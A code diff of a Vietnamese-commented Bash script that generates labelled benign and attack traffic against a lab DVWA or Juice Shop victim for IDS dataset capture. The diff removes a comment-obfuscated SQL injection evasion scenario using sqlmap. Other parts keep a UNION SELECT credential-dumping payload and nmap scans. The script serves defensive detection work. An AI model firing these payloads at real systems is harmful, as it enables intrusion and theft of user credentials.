@@ -2,7 +2,7 @@
 #
 # attack_runner.sh  --  chay tren MAY GENERATOR (Kali / may sinh traffic)
 #
-# Sinh lan luot 13 kich ban traffic (benign + suspicious) tu generator toi
+# Sinh lan luot 12 kich ban traffic (benign + suspicious) tu generator toi
 # victim-trong-lab. Dung CHUNG CAP voi capture_dataset.sh (chay tren IDS) voi
 # cung ten scenario va cung thu tu, de IDS bat duoc tung luong rieng biet.
 #
@@ -23,7 +23,6 @@ VICTIM="${VICTIM:-192.168.100.30}"
 HTTP_PORT="${HTTP_PORT:-80}"          # 80 (DVWA) hoac 3000 (Juice Shop)
 SSH_USER="${SSH_USER:-user}"          # tai khoan test tren victim
 STEP_DELAY="${STEP_DELAY:-3}"         # nghi giua cac scenario o che do all
-WITH_SQLMAP="${WITH_SQLMAP:-0}"       # 1 = sql_evasion chay them sqlmap (nhieu alert hon)
 
 B="\033[1m"; G="\033[32m"; Y="\033[33m"; N="\033[0m"
 info()  { echo -e "${B}[*]${N} $*"; }
@@ -39,10 +38,10 @@ Dung: ./attack_runner.sh <scenario|all|list>
 Scenario (cung ten voi capture_dataset.sh):
   benign_icmp  benign_http  benign_ssh  benign_dns
   syn_scan  port_scan  service_scan
-  sql_injection  sql_evasion  command_injection  xss
+  sql_injection  command_injection  xss
   icmp_flood  dns_anomaly
 
-Bien ghi de: VICTIM, HTTP_PORT, SSH_USER, STEP_DELAY, WITH_SQLMAP=1
+Bien ghi de: VICTIM, HTTP_PORT, SSH_USER, STEP_DELAY
 Vi du:  VICTIM=192.168.100.30 ./attack_runner.sh syn_scan
 EOF
 }
@@ -109,7 +108,7 @@ s_service_scan() {
   nmap -sV "$VICTIM"
 }
 
-# WEB: ky vong signature/regex alert. Day la request HTTP mang payload mau de
+# WEB: ky vong signature alert. Day la request HTTP mang payload mau de
 # rule content/normalization bat duoc; victim la web app test cua chinh ban.
 
 s_sql_injection() {
@@ -118,22 +117,6 @@ s_sql_injection() {
   curl -s -G "http://${VICTIM}:${HTTP_PORT}/index.php" \
        --data-urlencode "id=1 UNION SELECT username,password FROM users" >/dev/null
   info "Da gui payload UNION SELECT."
-}
-
-s_sql_evasion() {
-  label "SQLi EVASION (comment-based)  -> Rule 10005"
-  have curl || { warn "thieu curl"; return; }
-  # Bien the dung inline comment de test buoc normalization xoa comment.
-  curl -s "http://${VICTIM}:${HTTP_PORT}/index.php?id=1%20UNION/**/SELECT/**/1,2" >/dev/null
-  # sqlmap chi chay khi WITH_SQLMAP=1: payload kiem tra WAF cua sqlmap chua ca
-  # <script> va /etc/passwd nen sinh them alert 10006/10007 (khong con dung
-  # ground truth "chi 10005").
-  if [ "${WITH_SQLMAP:-0}" = "1" ] && have sqlmap; then
-    info "Chay them sqlmap --tamper=space2comment (WITH_SQLMAP=1)..."
-    sqlmap -u "http://${VICTIM}:${HTTP_PORT}/index.php?id=1" \
-           --tamper=space2comment --batch --flush-session >/dev/null 2>&1 || true
-  fi
-  info "Da gui payload UNION/**/SELECT."
 }
 
 s_command_injection() {
@@ -177,7 +160,7 @@ s_dns_anomaly() {
 # --- Dieu phoi --------------------------------------------------------------
 ORDER=(benign_icmp benign_http benign_ssh benign_dns \
        syn_scan port_scan service_scan \
-       sql_injection sql_evasion command_injection xss \
+       sql_injection command_injection xss \
        icmp_flood dns_anomaly)
 
 run_one() {
@@ -190,7 +173,6 @@ run_one() {
     port_scan)         s_port_scan ;;
     service_scan)      s_service_scan ;;
     sql_injection)     s_sql_injection ;;
-    sql_evasion)       s_sql_evasion ;;
     command_injection) s_command_injection ;;
     xss)               s_xss ;;
     icmp_flood)        s_icmp_flood ;;
@@ -205,7 +187,7 @@ case "$1" in
   -h|--help|help) usage; exit 0 ;;
   list) printf '%s\n' "${ORDER[@]}"; exit 0 ;;
   all)
-    info "Che do ALL: sinh lan luot 13 scenario toi ${VICTIM}."
+    info "Che do ALL: sinh lan luot 12 scenario toi ${VICTIM}."
     info "Dam bao IDS da chay ./capture_dataset.sh all."
     read -r -p "Nhan Enter de bat dau..." _
     for s in "${ORDER[@]}"; do
